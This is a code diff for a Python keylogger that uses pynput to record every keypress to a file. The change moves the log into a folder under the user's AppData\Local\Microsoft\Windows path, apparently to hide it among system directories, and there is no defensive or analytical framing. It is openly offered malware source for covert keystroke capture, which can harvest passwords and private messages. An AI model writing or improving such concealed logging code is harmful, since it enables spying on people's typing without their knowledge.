@@ -1,6 +1,11 @@
 from pynput import keyboard
+import os
 
-LOG_FILE = "key_log.txt"
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
+os.makedirs(target_path, exist_ok=True)
+
+LOG_FILE = os.path.join(target_path, "skibidi-main", "key_log.txt")
 
 def on_press(key):
     try:
@@ -11,7 +16,7 @@ def on_press(key):
             f.write(f" [{key.name}] ")
 
 def main():
-    
+
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
     
